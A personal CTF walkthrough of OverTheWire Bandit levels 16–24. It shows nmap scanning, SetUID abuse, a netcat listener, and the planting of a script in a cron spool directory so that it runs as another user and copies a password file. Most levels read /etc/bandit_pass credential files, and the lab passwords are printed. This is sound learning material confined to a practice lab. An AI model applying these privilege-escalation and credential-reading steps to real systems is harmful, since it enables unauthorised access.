## 🔑 Next-Level Credential

The service running on:

```text
localhost:31790
```

returned an OpenSSH private key.

Unlike previous levels, the next credential was not a normal password. Instead, I received a private SSH key that can be used to authenticate as the next Bandit user.

The private key can be saved to a file and used with SSH in the following way:

```bash
ssh -i <private_key_file> bandit17@bandit.labs.overthewire.org -p 2220
```

The private key file must have restrictive permissions before SSH will accept it.

For example:

```bash
chmod 600 <private_key_file>
```

Then it can be used for authentication.

## 🧠 What I Learned

- `nmap` can be used to scan for open ports.
- `-p` specifies the port or port range to scan.
- `-sV` enables service and version detection.
- Multiple services can be running on different ports on the same machine.
- `echo` services simply send back the data they receive.
- `ssl/echo` indicates an echo service protected by SSL/TLS.
- `openssl s_client` can be used to test services that require SSL/TLS.
- Not every SSL/TLS service provides the desired result, so individual services may need to be tested.
- SSH private keys can be used instead of passwords for authentication.

---

## 📌 Key Takeaway

The main strategy for this level was to first narrow down the possible services instead of manually testing all 1001 ports.

I scanned the port range using:

```bash
nmap -sV -p 31000-32000 localhost
```

This revealed two SSL/TLS services:

```text
31518
31790
```

The first SSL/TLS service on port `31518` simply echoed my password back.

I then tested port `31790`:

```bash
echo "kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V" | openssl s_client -connect localhost:31790 -ign_eof
```

This service returned an **OpenSSH private key**, which could then be used as the credential to access **Level 17**.

# Level 17 → 18

## 🎯 Objective

There are two files in the home directory:

```text
passwords.old
passwords.new
```

The password for the next level is stored in `passwords.new` and is the only line that has changed between `passwords.old` and `passwords.new`.

Therefore, I needed to compare the two files and identify the changed line.

## 🔎 Enumeration

I first listed the files in the home directory:

```bash
ls
```

This showed the following files:

```text
passwords.old
passwords.new
```

Since both files contained mostly identical lines, manually reading and comparing every line would be inefficient.

## 💡 Solution

I used the `diff` command to compare the two files:

```bash
diff passwords.new passwords.old
```

The `diff` command compares two files and displays the differences between them.

The output was:

```text
42c42
< OQxXZjELndr90zuhOTDYBEomI0SZITXI
---
> qOg5pVOjPx9x9VccyYBADiT4xxyoUB8D
```

## 🔍 Understanding the Output

The first line:

```text
42c42
```

indicates that line `42` in one file differs from line `42` in the other file.

Since I used:

```bash
diff passwords.new passwords.old
```

the first file is:

```text
passwords.new
```

and the second file is:

```text
passwords.old
```

The symbols in the output mean:

```text
<  Line from the first file
>  Line from the second file
```

Therefore:

```text
< OQxXZjELndr90zuhOTDYBEomI0SZITXI
```

is the line from:

```text
passwords.new
```

And:

```text
> qOg5pVOjPx9x9VccyYBADiT4xxyoUB8D
```

is the line from:

```text
passwords.old
```

Since the challenge stated that the password is stored in `passwords.new`, the password for **Level 18** was:

```text
OQxXZjELndr90zuhOTDYBEomI0SZITXI
```

## 🔑 Password

```text
OQxXZjELndr90zuhOTDYBEomI0SZITXI
```

## 🧪 Additional Command

I also ran:

```bash
diff passwords.new passwords.old | cat
```

This produced the same output.

This happens because the pipe sends the output of `diff` to `cat`, and `cat` simply displays that output.

Therefore, in this case:

```bash
diff passwords.new passwords.old
```

and:

```bash
diff passwords.new passwords.old | cat
```

produce the same visible result.

Using `| cat` is unnecessary here because `diff` already prints its output directly to the terminal.

## 🧠 What I Learned

- `diff` is used to compare the contents of two files.
- The order of the files in the `diff` command is important.
- `<` represents a line from the first file.
- `>` represents a line from the second file.
- `42c42` indicates that line 42 was changed.
- Piping the output of `diff` to `cat` does not change the output in this situation.
- Comparing files with command-line tools is much faster than manually checking every line.

---

## 📌 Key Takeaway

The order of files in the `diff` command matters.

I used:

```bash
diff passwords.new passwords.old
```

Because `passwords.new` was the first file, the line beginning with `<` belonged to `passwords.new`.

The password was:

```text
OQxXZjELndr90zuhOTDYBEomI0SZITXI
```

# Level 18 → 19

## 🎯 Objective

The password for the next level is stored in a file named:

```text
readme
```

in the home directory.

However, the `.bashrc` file had been modified to immediately log the user out when logging in through SSH.

Therefore, a normal interactive SSH login could not be used.

## 🔎 Understanding the Problem

Normally, I would connect to the Bandit server using SSH:

```bash
ssh -4 bandit18@bandit.labs.overthewire.org -p 2220
```

However, when starting an interactive shell, the shell configuration could cause `.bashrc` to be executed.

Since `.bashrc` had been modified to log the user out, logging in normally would immediately terminate the session.

The challenge was therefore to retrieve the contents of `readme` without starting a normal interactive session.

## 💡 Solution

SSH allows a command to be executed directly on the remote server.

Instead of logging in and then manually running `cat readme`, I included the command directly in the SSH command:

```bash
ssh -4 bandit18@bandit.labs.overthewire.org -p 2220 cat readme
```

This instructed SSH to connect to the server and execute:

```bash
cat readme
```

directly.

## 🔍 Command Breakdown

### `ssh`

```bash
ssh
```

SSH is used to establish a secure connection to a remote machine.

### `-4`

```bash
-4
```

This tells SSH to use IPv4.

### Username and Server

```bash
bandit18@bandit.labs.overthewire.org
```

This specifies:

- Username: `bandit18`
- Server: `bandit.labs.overthewire.org`

### `-p 2220`

```bash
-p 2220
```

This specifies the SSH port.

The Bandit SSH service runs on port:

```text
2220
```

instead of the default SSH port `22`.

### Remote Command

```bash
cat readme
```

This command is executed directly on the remote server.

`cat` reads and displays the contents of the `readme` file.

## 🔑 Password

The command returned the password for **Level 19**:

```text
KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI
```

## 🧠 What I Learned

- `.bashrc` is a shell configuration file that can affect a user's shell session.
- A modified `.bashrc` can interfere with a normal interactive SSH login.
- SSH can execute commands directly on a remote server.
- A remote command can be specified after the SSH connection options.
- Executing a command directly can avoid the need for an interactive shell session.
- `cat` can be executed remotely through SSH to display a file.

---

## 📌 Key Takeaway

Instead of starting an interactive SSH session, I executed the required command directly through SSH:

```bash
ssh -4 bandit18@bandit.labs.overthewire.org -p 2220 cat readme
```

This connected to the server, executed:

```bash
cat readme
```

and returned the password without requiring me to interact with the modified shell configuration.

The password for **Level 19** was:

```text
KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI
```

# Level 19 → 20

## 🎯 Objective

To gain access to the next level, I needed to use the **SetUID binary** in the home directory.

The password for the next level is stored in the usual location:

```text
/etc/bandit_pass/bandit20
```

However, I needed to use the provided SetUID binary to access it.

## 🔎 Initial Attempt

I first tried to read the password file directly:

```bash
cat /etc/bandit_pass/bandit20
```

This returned:

```text
Permission denied
```

This happened because the `bandit19` user did not have sufficient permissions to read the `bandit20` password file.

## 🔍 Finding the SetUID Binary

I used:

```bash
ls
```

to list the files in the home directory.

I found the SetUID binary:

```text
bandit20-do
```

I first executed it without arguments as suggested by the challenge:

```bash
./bandit20-do
```

This displayed information about how to use the binary.

## 💡 Solution

The SetUID binary allows a command to be executed with the privileges of the user who owns the binary.

I used it to execute the `cat` command:

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

Here:

- `./bandit20-do` executes the SetUID binary from the current directory.
- `cat` is the command that I want the binary to execute.
- `/etc/bandit_pass/bandit20` is the password file I want to read.

This time, the command was successful and returned:

```text
4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
```

## 🔑 Password

```text
4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
```

## 🧠 What I Learned

- Linux uses file permissions to control access to files.
- `Permission denied` means the current user does not have the required permissions.
- **SetUID (SUID)** is a Linux permission mechanism that allows an executable to run with the privileges of its owner.
- `./` is used to execute a program located in the current directory.
- A SetUID binary can execute commands with the privileges associated with its owner.
- The command passed to the SetUID binary was:

```bash
cat /etc/bandit_pass/bandit20
```

## 📌 Key Takeaway

My first attempt failed because `bandit19` did not have permission to directly read the password file:

```bash
cat /etc/bandit_pass/bandit20
```

I then used the provided SetUID binary:

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

The SetUID binary executed the `cat` command with the required privileges and revealed the password for **Level 20**.

# Level 20 → 21

## 🎯 Objective

There is a **SetUID binary** in the home directory that connects to `localhost` on a port specified as a command-line argument.

The binary then:

1. Connects to the specified port on `localhost`.
2. Reads a line of text from the connection.
3. Compares it with the password from the previous level (`bandit20`).
4. If the password is correct, it sends the password for the next level (`bandit21`) back through the connection.

## 🔎 Understanding the Challenge

The SetUID binary provided in the home directory was:

```text
suconnect
```

I needed to provide a port number to it:

```bash
./suconnect <port>
```

Since `suconnect` connects to the specified port, I needed to create a service that was listening on that port and would send the current password to it.

## 🌐 Creating a TCP Listener

I used **Netcat (`nc`)** to create a simple TCP listener:

```bash
echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -l -p 12345 &
```

### 🔍 Command Breakdown

#### `echo`

```bash
echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA"
```

`echo` outputs the password from the previous level.

#### Pipe `|`

```bash
|
```

The pipe sends the output of `echo` to the input of `nc`.

Therefore, the previous level's password is passed to Netcat.

#### `nc`

```bash
nc
```

`nc` stands for **Netcat**, a command-line networking utility that can establish TCP connections and listen for incoming connections.

#### `-l`

```bash
-l
```

The `-l` option puts Netcat into **listen mode**.

This makes Netcat wait for an incoming connection.

#### `-p 12345`

```bash
-p 12345
```

This tells Netcat to listen on port `12345`.

I chose `12345` as the port for the connection.

#### `&`

```bash
&
```

The `&` runs the command in the background.

This allowed me to use the same terminal to execute `suconnect` while the Netcat listener continued running.

## 🔗 Connecting With `suconnect`

After starting the listener, I executed:

```bash
./suconnect 12345
```

This caused `suconnect` to connect to:

```text
localhost:12345
```

The connection worked as follows:

```text
             suconnect
                 │
                 │ Connects to
                 ▼
          localhost:12345
                 │
                 ▼
          Netcat Listener
                 │
                 │ Sends password
                 ▼
      4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
```

## 📤 Program Output

The `suconnect` program first showed the password it received:

```text
Read: 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
```

It then confirmed that the password matched:

```text
Password matches, sending next password
```

Finally, it returned the password for the next level:

```text
bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
```

The shell also showed that the background Netcat process had finished:

```text
[1]+  Done
```

This happened because the Netcat listener exited after completing the connection.

## 🔑 Password

```text
bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
```

## 🧠 What I Learned

- `nc` (Netcat) can be used to create a TCP listener.
- `-l` puts Netcat into listening mode.
- `-p` specifies the port.
- `&` runs a command in the background.
- The pipe operator `|` sends the output of one command to another command.
- A client needs a server/listener to connect to.
- `suconnect` acts as the client in this challenge.
- Netcat acts as the server/listener.
- The client connected to the listener using the specified port.
- The SetUID binary checked whether the received password matched the current level's password.

## 📌 Key Takeaway

The important part of this level was understanding that **`suconnect` connects to the port rather than listening on it**.

Therefore, I first created a listener using:

```bash
echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -l -p 12345 &
```

Then I connected to it using:

```bash
./suconnect 12345
```

The program confirmed:

```text
Read: 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
Password matches, sending next password
```

and returned:

```text
bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
```

Therefore, the password for **Level 21** was:

```text
bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
```

# Level 21 → 22

## 🎯 Objective

A program is running automatically at regular intervals using **cron**, the time-based job scheduler.

The challenge instructed me to look inside:

```text
/etc/cron.d/
```

and find the configuration that determines which command is being executed.

## 🔎 Finding the Cron Job

I first listed the contents of `/etc/cron.d/`:

```bash
ls /etc/cron.d/
```

This displayed:

```text
behemoth4_cleanup
clean_tmp
cronjob_bandit22
cronjob_bandit23
cronjob_bandit24
e2scrub_all
leviathan5_cleanup
manpage3_resetpw_job
otw-tmp-dir
```

The relevant file for this level was:

```text
cronjob_bandit22
```

I then changed into the directory:

```bash
cd /etc/cron.d/
```

## 📄 Examining the Cron Configuration

I read the cron configuration using:

```bash
cat cronjob_bandit22
```

It contained:

```text
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

The important entry was:

```text
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

### 🔍 Understanding the Cron Entry

The five fields:

```text
* * * * *
```

represent:

```text
minute hour day-of-month month day-of-week
```

Using `*` in all five positions means the command runs **every minute**.

The next field:

```text
bandit22
```

specifies the user that the cron job runs as.

Therefore, the script is executed every minute as the `bandit22` user.

The command being executed is:

```text
/usr/bin/cronjob_bandit22.sh
```

The following:

```text
&> /dev/null
```

redirects both standard output and standard error to `/dev/null`, so the cron job does not display output.

## 🔍 Examining the Script

I then read the script:

```bash
cat /usr/bin/cronjob_bandit22.sh
```

The script contained:

```bash
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

### Line 1: `#!/bin/bash`

```bash
#!/bin/bash
```

This is called a **shebang**.

It tells the operating system that the script should be executed using the Bash interpreter located at:

```text
/bin/bash
```

### Line 2: `chmod 644`

```bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

`chmod` is used to change file permissions.

The permission:

```text
644
```

means:

```text
Owner  → read + write
Group  → read
Others → read
```

Since the file is made readable by others, the `bandit21` user can read it.

### Line 3: Password Redirection

```bash
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

This command reads the password file:

```text
/etc/bandit_pass/bandit22
```

The cron job is running as `bandit22`, so the script has permission to read that file.

The `>` symbol is the **output redirection operator**.

Instead of displaying the password on the terminal, it redirects the output into:

```text
/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

The overall process is therefore:

```text
Cron
  │
  │ Every minute
  ▼
cronjob_bandit22.sh
  │
  │ Runs as bandit22
  ▼
Reads /etc/bandit_pass/bandit22
  │
  ▼
Writes password to /tmp/...
  │
  ▼
chmod 644 makes the file readable
  │
  ▼
I can read the file
```

## 🔑 Retrieving the Password

Since the cron job runs every minute, it created the temporary file and placed the password inside it.

I read the file using:

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

This returned:

```text
RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
```

## 🔑 Password

```text
RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
```

## 🧠 What I Learned

- **Cron** is used to schedule commands and scripts to run automatically.
- Cron configuration files can be found in `/etc/cron.d/`.
- The five `*` fields in a cron expression represent minute, hour, day of month, month, and day of week.
- `* * * * *` means the command runs every minute.
- The username after the cron schedule specifies which user executes the command.
- `chmod 644` makes a file readable by the owner, group, and other users while only the owner can write to it.
- `>` redirects command output into a file.
- `/dev/null` can be used to discard command output.
- A scheduled task running with higher privileges can create files that another user may be able to read.

---

## 📌 Key Takeaway

The main idea of this level was to follow the chain:

```text
/etc/cron.d/cronjob_bandit22
        ↓
/usr/bin/cronjob_bandit22.sh
        ↓
Runs every minute as bandit22
        ↓
Reads /etc/bandit_pass/bandit22
        ↓
Writes password to /tmp/...
        ↓
chmod 644
        ↓
Password becomes readable
```

The important commands I used were:

```bash
ls /etc/cron.d/
```

```bash
cat /etc/cron.d/cronjob_bandit22
```

```bash
cat /usr/bin/cronjob_bandit22.sh
```

and finally:

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

which gave me the password for **Level 22**:

```text
RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
```

# Level 22 → 23

## 🎯 Objective

A program is running automatically at regular intervals using **cron**, the time-based job scheduler.

The challenge instructed me to look in:

```text
/etc/cron.d/
```

and find out what command is being executed.

The goal was to understand the script and retrieve the password for **Level 23**.

## 🔎 Finding the Cron Job

I first checked the contents of my home directory:

```bash
ls
```

There were no files of interest, so I moved to the cron configuration directory:

```bash
cd /etc/cron.d/
```

I then listed the files:

```bash
ls
```

Among the files, I found:

```text
cronjob_bandit23
```

I read its contents:

```bash
cat cronjob_bandit23
```

The output was:

```text
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

## 🔍 Understanding the Cron Job

The important line was:

```text
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null
```

The five `*` characters mean that the command runs every minute:

```text
* * * * *
│ │ │ │ │
│ │ │ │ └── Day of week
│ │ │ └──── Month
│ │ └────── Day of month
│ └──────── Hour
└────────── Minute
```

The username:

```text
bandit23
```

means that the script is executed as the **bandit23** user.

The script being executed is:

```text
/usr/bin/cronjob_bandit23.sh
```

## 📄 Reading the Script

I initially tried:

```bash
cat cronjob_bandit23.sh
```

but this returned:

```text
cat: cronjob_bandit23.sh: No such file or directory
```

This was because I was currently inside:

```text
/etc/cron.d/
```

while the script was actually located in:

```text
/usr/bin/
```

I therefore used the full path:

```bash
cat /usr/bin/cronjob_bandit23.sh
```

The script contained:

```bash
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

## 🔍 Understanding the Script

### Line 1

```bash
#!/bin/bash
```

This is the **shebang** and tells the system to execute the script using Bash.

### Line 2

```bash
myname=$(whoami)
```

`whoami` prints the username of the user currently running the script.

The output is stored in the variable:

```text
myname
```

This is important because the cron job runs the script as:

```text
bandit23
```

Therefore, when cron executes the script:

```bash
myname=bandit23
```

### Line 3

```bash
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
```

This line generates the name of the temporary file.

First:

```bash
echo I am user $myname
```

When the script runs as `bandit23`, this becomes:

```bash
echo I am user bandit23
```

The output is then piped into:

```bash
md5sum
```

which generates an MD5 hash.

Finally:

```bash
cut -d ' ' -f 1
```

extracts only the hash and removes the additional information printed by `md5sum`.

For `bandit23`, the resulting filename is:

```text
7dfc5d0348e965fba8b56a01c1508c98
```

Therefore:

```text
mytarget=7dfc5d0348e965fba8b56a01c1508c98
```

### Line 4

```bash
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
```

This prints a debug message showing which password file is being copied and where it is being copied.

### Line 5

```bash
cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

This reads the password file corresponding to the current user and redirects its contents into the temporary file.

Since cron executes the script as `bandit23`, the command effectively becomes:

```bash
cat /etc/bandit_pass/bandit23 > /tmp/7dfc5d0348e965fba8b56a01c1508c98
```

Therefore, the password for `bandit23` will be stored in:

```text
/tmp/7dfc5d0348e965fba8b56a01c1508c98
```

## 🧪 Manually Executing the Script

The challenge suggested executing the script to see its debug information.

I ran:

```bash
/usr/bin/cronjob_bandit23.sh
```

I got:

```text
Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
```

I then read the generated file:

```bash
cat /tmp/8169b67bd894ddbb4412f91573b38db3
```

This returned:

```text
RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
```

However, this was **not the new password**.

### Why?

I had manually executed the script while logged in as:

```text
bandit22
```

Therefore:

```bash
whoami
```

returned:

```text
bandit22
```

So the script copied:

```text
/etc/bandit_pass/bandit22
```

instead of:

```text
/etc/bandit_pass/bandit23
```

The actual cron job runs the script as:

```text
bandit23
```

so I needed to calculate the target filename using `bandit23`.

## 🔐 Finding the Correct Temporary File

The script uses:

```bash
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
```

Since the cron job runs the script as `bandit23`, I calculated the filename manually:

```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
```

This returned:

```text
8ca319486bfbbc3663ea0fbe81326349
```

Therefore, the password should be stored in:

```text
/tmp/8ca319486bfbbc3663ea0fbe81326349
```

I read the file using:

```bash
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

This returned:

```text
gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
```

## 🔑 Password

```text
gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
```

## 🧠 What I Learned

The important part of this level was understanding that the script behaves differently depending on which user executes it.

When I manually ran:

```bash
/usr/bin/cronjob_bandit23.sh
```

I was logged in as `bandit22`, so:

```bash
whoami
```

returned:

```text
bandit22
```

and the script copied the `bandit22` password.

However, the cron configuration specifies:

```text
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh
```

so cron executes the script as `bandit23`.

This means:

```bash
myname=$(whoami)
```

becomes:

```text
myname=bandit23
```

and the script ultimately performs the equivalent of:

```bash
cat /etc/bandit_pass/bandit23 > /tmp/8ca319486bfbbc3663ea0fbe81326349
```

I could then read the password with:

```bash
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

which gave:

```text
gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
```
# Bandit Level 23 → Level 24

## 🎯 Objective

A program is running automatically at regular intervals using **cron**, the time-based job scheduler.

The challenge instructed me to look inside:

```text
/etc/cron.d/
```

and find the configuration that determines which command is being executed.

This level also requires creating my **first shell script**.

The important idea is that the cron job runs as **bandit24**, while I am logged in as **bandit23**. By creating a shell script that gets executed by the cron job, I can make `bandit24` perform an action that `bandit23` normally cannot perform.

## 🔎 Finding the Cron Job

I first examined the cron configuration:

```bash
cat cronjob_bandit24
```

It contained:

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

The important entry was:

```text
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

### 🔍 Understanding the Cron Entry

The five fields:

```text
* * * * *
```

represent:

```text
minute hour day-of-month month day-of-week
```

Since all five fields contain `*`, the command runs:

```text
Every minute
```

The next field:

```text
bandit24
```

specifies the user under which the command runs.

Therefore:

```text
/usr/bin/cronjob_bandit24.sh
```

is executed every minute as the **bandit24** user.

The following:

```text
&> /dev/null
```

redirects both standard output and standard error to `/dev/null`.

Therefore, the cron job runs silently.

## 📄 Examining the Cron Script

I first accidentally tried:

```bash
cat usr/bin/cronjob_bandit24.sh
```

This failed because the path was missing the `/` at the beginning:

```text
cat: usr/bin/cronjob_bandit24.sh: No such file or directory
```

The correct command was:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The script contained:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

## 🧠 Understanding the Script

There are several important parts of this script.

### `#!/bin/bash`

```bash
#!/bin/bash
```

This is called a **shebang**.

It tells Linux to execute the script using the Bash interpreter located at:

```text
/bin/bash
```

### `shopt -s nullglob`

```bash
shopt -s nullglob
```

This enables the Bash `nullglob` option.

It makes patterns that do not match any files expand to nothing instead of remaining as literal patterns.

### Finding the Current User

```bash
myname=$(whoami)
```

`whoami` prints the username of the user executing the script.

Since the cron job runs as:

```text
bandit24
```

the value of:

```text
$myname
```

will be:

```text
bandit24
```

Therefore:

```text
/var/spool/"$myname"/foo
```

becomes:

```text
/var/spool/bandit24/foo
```

### Changing Directory

The script then executes:

```bash
cd /var/spool/"$myname"/foo || exit
```

Because the script runs as `bandit24`, it changes into:

```text
/var/spool/bandit24/foo
```

This is the directory where the cron job looks for scripts.

I tried accessing this directory myself:

```bash
ls /var/spool/bandit24/foo
```

but received:

```text
ls: cannot open directory '/var/spool/bandit24/foo': Permission denied
```

This is expected because I am logged in as `bandit23`, not `bandit24`.

## 🔍 Understanding the Loop

The script contains:

```bash
for i in * .*;
do
```

This loops through the files in the directory, including hidden files.

The script then checks:

```bash
if [ "$i" != "." ] && [ "$i" != ".." ];
```

This prevents it from processing the special directory entries:

```text
.
..
```

For each remaining file, it determines the owner:

```bash
owner="$(stat --format "%U" "./$i")"
```

The `stat` command provides information about a file.

The option:

```text
--format "%U"
```

prints the username of the file owner.

The next condition is extremely important:

```bash
if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
```

The script executes the file only when:

1. The file is owned by `bandit23`.
2. The file is a regular file.

Therefore, I need to place a script in:

```text
/var/spool/bandit24/foo
```

and make sure that the script is owned by:

```text
bandit23
```

Since I create the file as `bandit23`, this condition will be satisfied.

## ⚙️ Executing the Script

The cron job executes the script using:

```bash
timeout -s 9 60 "./$i"
```

This executes my script with a maximum runtime of:

```text
60 seconds
```

The `-s 9` option specifies signal 9, which is `SIGKILL`.

After the script is executed, the cron job removes it:

```bash
rm -rf "./$i"
```

This explains the warning in the challenge:

> Keep in mind that your shell script is removed once executed.

Because of this, it is a good idea to keep a copy of the original script somewhere else.

## 📝 Creating My Shell Script

I created a temporary workspace:

```bash
mkdir /tmp/my_workspace
```

I then gave the directory full permissions:

```bash
chmod 777 /tmp/my_workspace
```

and entered it:

```bash
cd /tmp/my_workspace
```

I created my shell script using:

```bash
echo '#!/bin/bash' > getpass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt' >> getpass.sh
```

The resulting script was:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt
```

### 🔍 Understanding My Script

The first line:

```bash
#!/bin/bash
```

tells the system to execute the file using Bash.

The second line:

```bash
cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt
```

reads:

```text
/etc/bandit_pass/bandit24
```

and redirects its contents into:

```text
/tmp/my_workspace/password.txt
```

The important part is that the script will be executed by the cron job as:

```text
bandit24
```

Therefore, the `cat` command runs with the permissions of `bandit24`.

## 🔐 Making the Script Executable

I then made the script executable:

```bash
chmod 777 getpass.sh
```

This gives the owner, group, and others read, write, and execute permissions.

## 📂 Placing the Script in the Cron Directory

I first tried:

```bash
cp getpass.sh /var/spool/bandit24/
```

but this failed:

```text
cp: cannot create regular file '/var/spool/bandit24/getpass.sh': Operation not permitted
```

This happened because the cron script does not look directly inside:

```text
/var/spool/bandit24/
```

It specifically looks inside:

```text
/var/spool/bandit24/foo
```

I therefore copied the script into the correct directory:

```bash
cp getpass.sh /var/spool/bandit24/foo/
```

This command succeeded.

## ⏳ Waiting for Cron

The cron job runs every minute:

```text
* * * * *
```

The cron script checks:

```text
/var/spool/bandit24/foo
```

It finds my script:

```text
getpass.sh
```

The file is owned by:

```text
bandit23
```

so it satisfies the condition:

```bash
[ "${owner}" = "bandit23" ] && [ -f "$i" ]
```

Cron then executes:

```text
getpass.sh
```

as:

```text
bandit24
```

My script reads:

```text
/etc/bandit_pass/bandit24
```

and writes the result to:

```text
/tmp/my_workspace/password.txt
```

After execution, the cron job deletes:

```text
getpass.sh
```

from the spool directory.

This is why keeping the original copy in:

```text
/tmp/my_workspace/
```

was useful.

## 🔑 Retrieving the Password

Initially, I checked the output file:

```bash
cat /tmp/my_workspace/password.txt
```

but received:

```text
cat: /tmp/my_workspace/password.txt: No such file or directory
```

This was because the cron job had not executed my script yet.

After waiting for the cron job to run, I checked the directory again:

```bash
ls
```

This time it showed:

```text
getpass.sh
password.txt
```

I then read the password:

```bash
cat password.txt
```

This returned:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

## 🔑 Password

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

## 🧠 What I Learned

* **Cron** is used to automatically execute commands at scheduled intervals.
* `/etc/cron.d/` contains cron configuration files.
* `* * * * *` means a command runs every minute.
* The username in a cron entry specifies which user executes the command.
* A cron job running as another user can have permissions that my current user does not have.
* `whoami` displays the current username.
* `$(command)` is **command substitution** in Bash.
* `stat --format "%U"` can be used to find the owner of a file.
* `-f` checks whether a path refers to a regular file.
* `timeout` can limit how long a command is allowed to run.
* `>` redirects command output into a file.
* A cron job can execute scripts placed in a specific directory.
* The cron script checks that submitted scripts are owned by `bandit23`.
* The cron job removes each processed script after execution.
* Keeping a backup copy of a shell script is useful when the original is automatically deleted.
* Shell scripting allows multiple Linux commands to be automated together.

---

## 📌 Key Takeaway

The main idea of this level was to understand the complete execution chain:

```text
/etc/cron.d/cronjob_bandit24
        ↓
Runs every minute as bandit24
        ↓
/usr/bin/cronjob_bandit24.sh
        ↓
Looks inside /var/spool/bandit24/foo
        ↓
Finds scripts owned by bandit23
        ↓
Executes the script as bandit24
        ↓
My script reads /etc/bandit_pass/bandit24
        ↓
Password is written to /tmp/my_workspace/password.txt
        ↓
Cron deletes the submitted script
        ↓
I read password.txt
```

The important commands I used were:

```bash
cat /etc/cron.d/cronjob_bandit24
```

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
mkdir /tmp/my_workspace
```

```bash
chmod 777 /tmp/my_workspace
```

```bash
cd /tmp/my_workspace
```

```bash
echo '#!/bin/bash' > getpass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt' >> getpass.sh
```

```bash
chmod 777 getpass.sh
```

```bash
cp getpass.sh /var/spool/bandit24/foo/
```

After waiting for cron to execute the script:

```bash
cat /tmp/my_workspace/password.txt
```

which gave me the password for **Level 24**:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

# Bandit Level 24 → Level 25

## 🎯 Objective

A daemon is listening on port:

```text
30002
```

The challenge states that the daemon will give me the password for **bandit25** if I provide:

1. The current password for **bandit24**
2. A secret **4-digit numeric PIN**

The PIN cannot be retrieved directly.

The only way to find it is to try all possible combinations from:

```text
0000
```

to:

```text
9999
```

This gives a total of:

```text
10,000 possible combinations
```

The challenge also mentions that I **do not need to create a new connection for every attempt**.

Therefore, I can use a single `nc` connection and send all 10,000 password/PIN combinations through it.

## 🗂️ Creating a Temporary Directory

I first created a temporary directory using:

```bash
mktemp -d
```

